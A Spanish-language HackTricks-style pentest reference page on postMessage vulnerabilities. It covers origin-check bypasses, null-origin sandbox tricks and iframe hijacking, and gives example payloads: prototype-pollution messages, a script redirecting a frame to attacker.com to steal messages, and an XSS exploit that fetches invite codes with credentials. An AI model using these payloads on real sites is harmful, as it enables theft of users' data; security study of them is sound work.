# Vulnerabilidades de PostMessage

## Vulnerabilidades de PostMessage

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Enviar **PostMessage**

**PostMessage** utiliza la siguiente funci√≥n para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede ser enviado a ese dominio** (incluso si el origen del objeto ventana es diferente).\
Si se utiliza el **comod√≠n**, los **mensajes podr√≠an ser enviados a cualquier dominio**, y se enviar√°n al origen del objeto Window.

### Atacando iframe y comod√≠n en **targetOrigin**

Como se explica en [**este informe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentras una p√°gina que puede ser **iframed** (sin protecci√≥n de `X-Frame-Header`) y que est√° **enviando mensajes sensibles** a trav√©s de **postMessage** utilizando un **comod√≠n** (\*), puedes **modificar** el **origen** del **iframe** y **filtrar** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la p√°gina puede ser iframed pero el **targetOrigin** est√° **configurado con una URL y no con un comod√≠n**, este **truco no funcionar√°**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Explotaci√≥n de addEventListener

**`addEventListener`** es la funci√≥n utilizada por JS para declarar la funci√≥n que est√° **esperando `postMessages`**.\
Se utilizar√° un c√≥digo similar al siguiente:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
### Enumeraci√≥n

Para encontrar **escuchas de eventos** en la p√°gina actual puedes:

- **Buscar** en el c√≥digo JS por `window.addEventListener` y `$(window).on` (_versi√≥n JQuery_)
- **Ejecutar** en la consola de herramientas para desarrolladores: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

- **Ir a** _Elementos --> Escuchas de eventos_ en las herramientas para desarrolladores del navegador

![](<../../.gitbook/assets/image (617).png>)

- Utilizar una **extensi√≥n para navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones para navegadores **interceptar√°n todos los mensajes** y te los mostrar√°n.

### Saltos de verificaci√≥n de origen

- El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos generados por acciones genuinas del usuario. Aunque es desafiante de evadir si se implementa correctamente, su importancia en las verificaciones de seguridad es notable.

- El uso de **`indexOf()`** para la validaci√≥n de origen en eventos de PostMessage puede ser susceptible a evasiones. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- El m√©todo **`search()`** de `String.prototype.search()` est√° destinado para expresiones regulares, no para cadenas. Pasar cualquier cosa que no sea una expresi√≥n regular conduce a una conversi√≥n impl√≠cita a regex, lo que hace que el m√©todo sea potencialmente inseguro. Esto se debe a que en regex, un punto (.) act√∫a como un comod√≠n, permitiendo evadir la validaci√≥n con dominios especialmente dise√±ados. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La funci√≥n **`match()`**, similar a `search()`, procesa regex. Si el regex no est√° estructurado correctamente, podr√≠a ser propenso a evasiones.

- La funci√≥n **`escapeHtml`** est√° destinada a sanear las entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado sino que sobrescribe las propiedades del objeto existente. Este comportamiento puede ser explotado. En particular, si un objeto puede ser manipulado de manera que su propiedad controlada no reconozca `hasOwnProperty`, el `escapeHtml` no funcionar√° como se espera. Esto se demuestra en los ejemplos a continuaci√≥n:

- Fallo esperado:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Evasi√≥n del escape:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es notablemente explotable debido a su propiedad de solo lectura `name`. Esta propiedad, cuando se usa en plantillas, no es saneada por la funci√≥n `escapeHtml`, lo que conlleva riesgos de seguridad potenciales.

- La propiedad `document.domain` en JavaScript puede ser establecida por un script para acortar el dominio, permitiendo una aplicaci√≥n m√°s relajada de la pol√≠tica de misma procedencia dentro del mismo dominio principal.

### Bypass de e.origin == window.origin

Al incrustar una p√°gina web dentro de un **iframe con sandbox** utilizando %%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%, es crucial entender que el origen del iframe se establecer√° como `null`. Esto es particularmente importante al tratar con **atributos de sandbox** y sus implicaciones en seguridad y funcionalidad.

Al especificar **`allow-popups`** en el atributo sandbox, cualquier ventana emergente abierta desde dentro del iframe hereda las restricciones de sandbox de su padre. Esto significa que a menos que tambi√©n se incluya el atributo **`allow-popups-to-escape-sandbox`**, el origen de la ventana emergente tambi√©n se establece como `null`, aline√°ndose con el origen del iframe.

Consecuentemente, cuando se abre una ventana emergente bajo estas condiciones y se env√≠a un mensaje desde el iframe a la ventana emergente usando **`postMessage`**, tanto el origen de env√≠o como el de recepci√≥n se establecen como `null`. Esta situaci√≥n lleva a un escenario donde **`e.origin == window.origin`** se eval√∫a como verdadero (`null == null`), porque tanto el iframe como la ventana emergente comparten el mismo valor de origen `null`.

Para m√°s informaci√≥n **lee**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Evadiendo e.source

Es posible verificar si el mensaje proviene de la misma ventana en la que el script est√° escuchando (especialmente interesante para **Scripts de Contenido de extensiones de navegador** para verificar si el mensaje fue enviado desde la misma p√°gina):
```javascript
// If it‚Äôs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
Puedes forzar que **`e.source`** de un mensaje sea nulo creando un **iframe** que **env√≠e** el **postMessage** y sea **eliminado inmediatamente**.

Para obtener m√°s informaci√≥n **lee:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypass de encabezado X-Frame

Para realizar estos ataques idealmente podr√°s **colocar la p√°gina web v√≠ctima** dentro de un `iframe`. Pero algunos encabezados como `X-Frame-Header` pueden **prevenir** ese **comportamiento**.\
En esos escenarios, a√∫n puedes usar un ataque menos sigiloso. Puedes abrir una nueva pesta√±a en la aplicaci√≥n web vulnerable y comunicarte con ella:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robo de mensajes enviados al hijo bloqueando la p√°gina principal

En la siguiente p√°gina puedes ver c√≥mo podr√≠as robar datos sensibles enviados a un **iframe secundario** bloqueando la p√°gina principal antes de enviar los datos y abusando de un **XSS en el hijo** para **filtrar los datos** antes de que sean recibidos:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Robo de mensajes modificando la ubicaci√≥n del iframe

Si puedes incluir un iframe de una p√°gina web sin X-Frame-Header que contenga otro iframe, puedes **cambiar la ubicaci√≥n de ese iframe hijo**, por lo que si est√° recibiendo un **postmessage** enviado usando un **comod√≠n**, un atacante podr√≠a **cambiar** el **origen** de ese iframe a una p√°gina **controlada** por √©l y **robar** el mensaje:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage a la Poluci√≥n de Prototipos y/o XSS

En escenarios donde los datos enviados a trav√©s de `postMessage` son ejecutados por JS, puedes **incluir** la **p√°gina** en un **iframe** y **explotar** la **poluci√≥n de prototipos/XSS** enviando el exploit a trav√©s de `postMessage`.

Un par de **XSS muy bien explicados a trav√©s de `postMessage`** se pueden encontrar en [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Ejemplo de un exploit para abusar de la **Poluci√≥n de Prototipos y luego XSS** a trav√©s de un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
Para **m√°s informaci√≥n**:

* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos**](../deserialization/nodejs-proto-prototype-pollution/)
* Enlace a la p√°gina sobre [**XSS**](../xss-cross-site-scripting/)
* Enlace a la p√°gina sobre [**contaminaci√≥n de prototipos del lado del cliente a XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Referencias

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
